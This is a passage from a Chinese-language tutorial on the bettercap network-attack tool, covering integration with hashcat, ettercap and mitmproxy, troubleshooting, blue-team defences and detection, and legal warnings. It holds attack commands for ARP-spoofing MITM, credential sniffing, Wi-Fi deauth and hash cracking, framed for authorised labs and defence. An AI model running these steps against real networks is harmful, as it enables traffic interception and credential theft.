| 抓到哈希 | 交给 [hashcat](../04-口令攻击/hashcat.md) 离线破解 |
| Wi-Fi 抓到握手 | `hcxpcapngtool` → `hashcat -m 22000` |
| **立即停止并恢复** | ⭐ `arp.spoof off`、`dns.spoof off`，然后 `exit`；**确认受害者 ARP 表已恢复** |

## 7. 与其他工具配合

```text
┌───────────────── bettercap（整合层）─────────────────┐
│                                                       │
│  [侦察]  net.recon（被动）/ net.probe（主动）          │
│         wifi（802.11 扫描）/ ble.recon                │
│              ↓                                        │
│  [MITM]  arp.spoof（IPv4）/ dhcp6.spoof（IPv6）        │
│              ↓                                        │
│  [欺骗]  dns.spoof / http.proxy / https.proxy         │
│              ↓                                        │
│  [嗅探]  net.sniff  → 凭据                             │
│              ↓                                        │
│  [编排]  api.rest + events.stream + caplet            │
└───────────────────────────────────────────────────────┘
              ↓ 抓到的东西交给专业工具深挖
   ┌──────────┴──────────┬──────────────┐
   ↓                     ↓              ↓
[hashcat]           [mitmproxy]     [wireshark]
破解 NTLM/WPA      深度 HTTP 篡改    深度协议分析
```

| 组合 | 说明 |
| --- | --- |
| **bettercap ↔ [ettercap](../07-嗅探与欺骗/ettercap.md)** | 都能做 ARP 投毒。**ettercap 更老、插件生态不同；bettercap 更现代、更易脚本化** |
| **bettercap ↔ [responder](../07-嗅探与欺骗/responder.md)** | **互补**：responder 抓 LLMNR/NBT-NS/mDNS 的 NetNTLM 哈希；bettercap 抓 HTTP/DNS 层。**两者常同时开**（responder 也可以由 bettercap 的 `http.server`/代理触发等价效果） |
| **bettercap → [hashcat](../04-口令攻击/hashcat.md)** | ⭐ 抓到 NetNTLM（`-m 5600`）或 WPA 握手（`-m 22000`）→ 离线破解 |
| **bettercap ↔ [mitmproxy](../07-嗅探与欺骗/mitmproxy.md)** | bettercap 做透明代理的**重定向**，mitmproxy 做**内容层的精细篡改**。两者可以串联（bettercap 把流量转发给 mitmproxy） |
| **bettercap ↔ [macchanger](../07-嗅探与欺骗/macchanger.md)** | bettercap 的 `mac.changer` 模块提供等价功能 |
| **bettercap ↔ [kismet](kismet.md)** | ⭐ **红蓝对抗**：用 bettercap 的 wifi 模块做 deauth，用 kismet 检测 `DEAUTHFLOOD` 告警 |
| **bettercap ↔ [airodump-ng](airodump-ng.md)** | bettercap 侦察，airodump-ng 做精细抓包 |
| **bettercap → [wireshark](../07-嗅探与欺骗/wireshark.md)** | `net.sniff.output` 写的 pcap 可以给 Wireshark 深度分析 |

**一个完整的隔离实验链路**：

```bash
# 终端 1：防守方（检测）
sudo kismet -c wlan0:channel=6 --no-ncurses

# 终端 2：进攻方（MITM + 嗅探）
sudo bettercap -iface eth0 -caplet /tmp/lab-mitm.cap

# 终端 3：分析抓到的流量
tshark -r /tmp/lab-capture.pcap -Y 'http.request'

# 抓到哈希后
hashcat -m 5600 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt
```

## 8. 常见坑与排错

### 8.1 参数风格

| 报错/现象 | 原因 | 解决 |
| --- | --- | --- |
| `flag provided but not defined: -iface`（写成 `--iface` 时） | **bettercap 用单短横线的长选项** | 用 `-iface` 而不是 `--iface` |
| `-h` 输出看不懂 | bettercap 的参数表很简略，**细节都在交互式 `help` 里** | 进去后敲 `help` / `help <module>` |

### 8.2 网络与接口

| 报错/现象 | 原因 | 解决 |
| --- | --- | --- |
| 选错了网卡 | 未指定 `-iface` 时自动选择 | ⭐ **总是显式 `-iface eth0`** |
| 网关识别错误 | 多网关/多网段环境 | `-gateway-override 192.168.1.1` |
| `net.show` 里只有网关和自己 | 没开 `net.probe`，且设备不主动发 ARP | 开 `net.probe on`（**但会发流量，会被检测**）；或等设备自然通信 |
| ARP 投毒后**自己也断网了** | 把网关毒掉了 | ⭐ **必须设 `arp.spoof.whitelist`** 保护网关；检查 `set arp.spoof.internal` 的值 |
| ARP 投毒后**整个网段断网** | 广播投毒（targets 设成了整个网段） | `arp.spoof.targets` **只写单个目标 IP**；绝不用 CIDR 除非明确需要 |
| 受害者一直断网不复原 | 设了 `arp.spoof.skip_restore` | **永远不要设这个变量**；或手工在受害者上 `arp -d` |
| 有 HTTPS 抓不到内容 | TLS 加密 | 需要透明代理 + 证书信任；**HSTS/证书固定会让它失败**（这正是防御措施） |

### 8.3 无线相关

| 报错/现象 | 原因 | 解决 |
| --- | --- | --- |
| bettercap 报网卡被占用 | 之前手工 `airmon-ng start` 了 | **不要手工切模式**；`airmon-ng stop` 后重启 bettercap |
| `wifi.recon` 起不来 | 网卡不支持监听 | 见 [airmon-ng](airmon-ng.md) 的芯片组表 |
| 扫不到 5 GHz | 默认只在 2.4 GHz 跳 | 配置信道/频率；`help wifi` 看相关变量 |
| 信道跳频导致漏握手 | 没锁定信道 | `set wifi.channel 6` |
| deauth 无效 | **目标启用了 PMF（802.11w）** | 无法通过 deauth 抓握手；改用 PMKID |
| 虚拟机里无线不工作 | USB 直通 | 物理机 + USB 网卡 |

### 8.4 模块与脚本

| 报错/现象 | 原因 | 解决 |
| --- | --- | --- |
| `help <module>` 里没有网上教程提到的变量 | **版本差异** | ⭐ **以本机 `help` 为准**，不要照搬旧教程 |
| caplet 不执行 | 路径错，或 caplet 语法错 | 用**绝对路径**；`-caplets-path` 指定搜索目录；逐行测试 |
| `-eval` 里多条命令只执行了第一条 | 分隔符问题 | 多条命令用 `;` 分隔；**注意 shell 引号**：`-eval 'a; b'` |
| `api.rest` 连不上 | 只监听 127.0.0.1 | 改 `api.rest.address`；注意新版默认用 **HTTPS** |
| `update` 模块提示要联网 | 它真的会下载二进制 | ⚠️ **不要用 `update`**——供应链风险。用 `apt upgrade bettercap` |
| 日志重定向到文件后很难看 | 有 ANSI 颜色码 | 加 `-no-colors` |

### 8.5 一个关键的安全实践

**永远在 caplet 里配置白名单**：

```bash
set arp.spoof.whitelist 192.168.1.1,192.168.1.254
```

**原因**：

| 不设白名单的后果 | 说明 |
| --- | --- |
| 把网关毒掉 | **整个网段断网**（包括你自己的管理连接） |
| 把不改动的设备毒掉 | 影响无关设备（在授权测试中可能**超出 ROE**） |
| 把自己毒掉 | 无法通过 SSH 管理，只能物理接触 |

**这是一条很容易被忽略、但代价极高的实践**。

## 9. 防御视角（蓝队）

bettercap 的每个模块都对应一个**具体的防御措施**。这一节把它们对应起来。

### 9.1 攻击面 → 对策总表

| bettercap 模块 | 攻击 | 蓝队对策 | 有效性 |
| --- | --- | --- | --- |
| `arp.spoof` | ARP 投毒（MITM 基础） | **DHCP Snooping + Dynamic ARP Inspection（DAI）**；**802.1X**；静态 ARP（小网络） | ✅ 高 |
| `dns.spoof` | DNS 投毒 | **DNSSEC**；**DNS over HTTPS/TLS（DoH/DoT）**；**响应策略区域（RPZ）** | ✅ 高 |
| `dhcp6.spoof` | DHCPv6 投毒 | **RA Guard**；**IPv6 首跳安全**；不需要 IPv6 就关掉 | ✅ 高 |
| `net.sniff` | 明文凭据嗅探 | **全程 HTTPS/TLS**；禁用 Telnet/FTP/HTTP Basic | ✅ 高 |
| `net.sniff` + 代理 | HTTPS 中间人 | **HSTS（含 preload）**；**证书固定（pinning）**；**CT 日志监控** | ✅ 高 |
| `http.proxy` / `https.proxy` | 内容篡改 | 同 HTTPS 对策；**子资源完整性（SRI）** | ✅ 中高 |
| `net.probe` | 主动主机探测 | 端口扫描检测；网络分段 | ⚠️ 中 |
| `syn.scan` | 端口扫描 | 防火墙 + IDS（Suricata/Snort） | ✅ 中高 |
| **`wifi`（deauth）** | Wi-Fi deauth | ⭐ **802.11w / PMF** | ✅ **高** |
| **`wifi`（PMKID/握手）** | Wi-Fi 破解 | ⭐ **WPA3-SAE + 长随机 PSK** | ✅ **高** |
| `mac.changer` | MAC 伪装 | 端口安全（Port Security）；NAC；MAC 随机化本身是隐私保护 | ⚠️ 中 |
| `ble.recon` | BLE 扫描 | 限制 BLE 广播内容；关闭不需要的 BLE | ⚠️ 中 |
| `mysql.server` | 假 MySQL 服务器 | 强制 TLS + 证书校验 | ✅ 高 |
| `http.server` | 假 Web 服务 | 用户培训（看域名）+ HSTS | ⚠️ 中 |

### 9.2 最重要的三条（按 ROI 排序）

```text
1. 网络层：启用 DHCP Snooping + Dynamic ARP Inspection
   → 彻底阻断 arp.spoof（bettercap 的 MITM 基础）
   → 这一条就废掉了 dns.spoof/http.proxy 等一大半模块

2. 传输层：全网 HTTPS + HSTS（含 preload）+ 关键应用证书固定
   → 让 net.sniff 抓不到内容，让透明代理失效

3. 无线层：WPA3-SAE + PMF + 关闭 WPS
   → 让 wifi 模块的三条路（deauth / PMKID / 握手）全部失效
```

### 9.3 具体配置示例

**① 交换机侧（阻断 ARP 投毒）**

在支持的企业交换机上（以 Cisco 语法为例）：

```text
! 启用 DHCP Snooping（ARP Inspection 的前提）
ip dhcp snooping
ip dhcp snooping vlan 10
no ip dhcp snooping information option
ip dhcp snooping trust            ! 上联口设为 trust

! 启用 Dynamic ARP Inspection
ip arp inspection vlan 10
ip arp inspection validate src-mac dst-mac ip
interface GigabitEthernet0/1
 ip arp inspection trust          ! 上联口设为 trust
```

**效果**：未授权的 ARP 响应会被交换机丢弃 → **`arp.spoof` 完全失效**。

**② 终端侧（防 DNS 投毒）**

```
Windows：启用 DNSSEC 校验（组策略下发 DNS 客户端配置）
浏览器：启用 DNS over HTTPS（Firefox/Chrome 均支持）
企业：部署内网 DoH/DoT 解析器，并强制终端使用
```

**效果**：`dns.spoof` 返回的伪造应答无法通过 DNSSEC 校验 → **被丢弃**。

**③ Web 侧（防 HTTPS 中间人）**

```
1. 全站启用 HSTS：
   Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
2. 提交到 HSTS preload 列表
3. 移动 App 启用证书固定（certificate pinning）
4. 监控 Certificate Transparency 日志，发现可疑证书签发
```

**效果**：攻击者的自签证书会被拒绝 → **透明代理失效**。

**④ 无线侧**

```
路由器管理界面：
  □ 加密方式：WPA3-SAE（或 WPA2/WPA3 混合，但优先纯 WPA3）
  □ 管理帧保护（PMF / 802.11w）：启用（如选项为「强制」，选它）
  □ WPS：关闭
  □ PSK：≥ 20 位随机（不用词表里的词）
  □ 固件：升级到最新
```

**效果**：`wifi` 模块的 deauth / PMKID / 握手三条路全部失效。

### 9.4 检测（当预防失效时）

**① 检测 ARP 投毒**

| 方法 | 说明 |
| --- | --- |
| **ARP 表变化监控** | 监控网关 MAC 是否变化（同一 IP 的 MAC 突然改变 = 投毒） |
| **ARP 请求/响应速率** | bettercap 会持续发送 ARP 响应（**每分钟数十次**），远超正常设备的频率 |
| **同一 MAC 声明多个 IP** | 攻击者会用同一 MAC 应答多个 IP 的 ARP |
| **两个 IP 声称同一 MAC** | 检查 ARP 表里的 MAC 冲突 |

**开源的检测方法**（脚本思路）：

```bash
# 监控网关 MAC 是否变化（示例，仅供自有网络使用）
GW_IP=$(ip route | awk '/default/{print $3; exit}')
LAST_MAC=""
while true; do
  MAC=$(arp -n "$GW_IP" | awk '/ether/{print $3}')
  if [ -n "$LAST_MAC" ] && [ "$MAC" != "$LAST_MAC" ]; then
    echo "⚠️ 网关 MAC 变化: $LAST_MAC -> $MAC  (可能的 ARP 投毒!)"
  fi
  LAST_MAC="$MAC"
  sleep 5
done
```

**② 检测 deauth 攻击**

见 [aireplay-ng](aireplay-ng.md) 与 [kismet](kismet.md) 的检测章节。**Kismet 的 `DEAUTHFLOOD` 告警是现成的方案。**

**③ 检测 DNS 投毒**

| 方法 | 说明 |
| --- | --- |
| 对关键域名做**多解析器比对** | 用不同 DNS 服务器解析同一域名，结果不一致 = 可能被投毒 |
| 监控 DNS 应答的 TTL 异常 | 投毒应答的 TTL 常与真实值不同 |
| 部署 **DNSSEC 校验失败日志** | 校验失败即告警 |

**④ 检测端口扫描 / 主机探测**

```
Suricata / Snort 规则：
  - 短时间内一个源 IP 对大量端口发 SYN → 端口扫描
  - 短时间内一个源 IP 对大量主机发 ARP/ICMP → 主机探测
```

**⑤ 检测 TLS 中间人**

| 方法 | 说明 |
| --- | --- |
| **证书链校验** | 监控是否出现自签或未知 CA 签发的证书 |
| **Certificate Transparency 监控** | 查询 CT 日志，发现为你的域名签发的异常证书 |
| **HSTS 违规上报** | 浏览器会上报 HSTS 违规 |
| **证书固定（pinning）告警** | 移动 App 里固定证书，不匹配即告警/拒绝连接 |

### 9.5 一个重要的认知

**从 bettercap 的模块清单反过来读，就是一份完整的网络加固清单**：

```
bettercap 有的模块         →    你该做的加固
────────────────────────────────────────────────
arp.spoof                 →    DAI + DHCP Snooping
dns.spoof                 →    DNSSEC / DoH
dhcp6.spoof               →    RA Guard + IPv6 首跳安全
net.sniff（明文）          →    全程 HTTPS
https.proxy（拦截）        →    HSTS + 证书固定
wifi（deauth）             →    PMF / 802.11w
wifi（PMKID / 握手）       →    WPA3 + 长随机 PSK
mac.changer               →    端口安全 + NAC
syn.scan                  →    防火墙 + IDS
```

**这是本文最该带走的东西**：

> **不需要记住 bettercap 的每条命令。需要记住的是「每一项攻击都对应一项防御」——而防御比攻击便宜得多。**

## 10. 参考

- 官方站点与文档：<https://www.bettercap.org>
- **模块文档**：<https://www.bettercap.org/modules/>
- 官方仓库：<https://github.com/bettercap/bettercap>
- Kali 工具页：<https://www.kali.org/tools/bettercap/>
- 本机命令：`bettercap -h`（命令行参数）、**交互式 `help` / `help <module>`（真正的文档）**
- 相关本目录：[aircrack-ng](aircrack-ng.md)（套件总览）、[airmon-ng](airmon-ng.md)、[airodump-ng](airodump-ng.md)、[aireplay-ng](aireplay-ng.md)、[wifite](wifite.md)、[reaver](reaver.md)、[kismet](kismet.md)
- 相关其他目录：[ettercap](../07-嗅探与欺骗/ettercap.md)、[responder](../07-嗅探与欺骗/responder.md)、[mitmproxy](../07-嗅探与欺骗/mitmproxy.md)、[macchanger](../07-嗅探与欺骗/macchanger.md)、[wireshark](../07-嗅探与欺骗/wireshark.md)、[hashcat](../04-口令攻击/hashcat.md)

## ⚠️ 法律与伦理

**bettercap 是本目录中法律风险最集中的工具**，因为它把多种攻击能力打包在一起，且**默认行为就可能造成大范围影响**。

**为什么风险高**：

| 行为 | 法律性质 |
| --- | --- |
| **ARP 投毒** | **劫持他人网络流量**——这是典型的中间人攻击，构成非法侵入/非法获取数据 |
| **DNS 投毒** | 引导用户到仿冒站点，可能构成诈骗预备 |
| **deauth** | 干扰通信，构成破坏计算机信息系统 |
| **凭据嗅探** | 截获通信内容，涉及个人信息 |
| **透明代理拦截 HTTPS** | 破解加密通信，性质严重 |
| **默认的 `arp.spoof.targets` 若配错** | **可能一次性劫持整个网段的流量** |

**特别警告**：

> bettercap 的 `arp.spoof` 如果 `targets` 设成一个网段（如 `192.168.1.0/24`），会**同时劫持所有设备的流量**。这不是「不小心」，而是**大规模未授权访问**。
>
> **永远只对单个、已授权的目标 IP 操作**。

**相关法律责任**（中国大陆）：

| 法律 | 条款 | 行为 |
| --- | --- | --- |
| 《刑法》 | 第二百八十五条 | **非法侵入计算机信息系统罪** / **非法获取计算机信息系统数据罪** |
| 《刑法》 | 第二百八十六条 | 破坏计算机信息系统罪（ARP 投毒导致断网） |
| 《刑法》 | 第二百五十三条之一 | 侵犯公民个人信息罪（窃取凭据/流量） |
| 《刑法》 | 第二百六十六条 | 诈骗罪（若用 DNS 投毒做钓鱼） |
| 《网络安全法》 | 第二十七条 | 禁止任何危害网络安全的活动 |
| 《个人信息保护法》 | 相关条款 | 截获、处理个人信息需有合法性基础 |

**本教程仅适用于**：

- ✅ **你自己搭建的隔离实验网络**（host-only 虚拟网络、隔离 VLAN），**其中没有别人的设备**
- ✅ 有**书面授权**、明确列出授权 IP 范围**与允许的攻击类型**的渗透测试
- ✅ 你自己搭建的隔离无线实验室
- ✅ 授权的 CTF 靶场

**使用前的强制检查清单**：

```text
[ ] -iface 指定的网卡连的是隔离实验网络（不是生产网）？
[ ] arp.spoof.targets 只写了单个我已授权的 IP？
[ ] 设置了 arp.spoof.whitelist 保护网关？
[ ] 没有设置 arp.spoof.skip_restore？
[ ] 我知道退出时会自动恢复 ARP 表，且我会验证恢复成功？
[ ] dns.spoof.domains 只列了我自己的测试域名？
[ ] 我的授权书里明确写了允许 ARP 投毒与流量嗅探？
```

**任何一项打不上勾，就不要运行。**

**最安全的学法**：

```text
✅ 在一个 host-only 的 VirtualBox/VMware 网络里（只有你的 Kali + 靶机，没有物理网卡桥接）
   用 bettercap 攻击你自己的靶机，观察完整的 MITM 流程
   → 完全隔离，不接触任何外部网络，覆盖 100% 的知识点

✅ 用 caplet 把攻击写下来，配合本目录的防御章节，做一次红蓝对抗演练
   → 这是本文最有价值的学习方式
```

**最后一句**：**bettercap 的模块清单就是一份网络加固清单。学会用它攻击，是为了知道该防什么。**
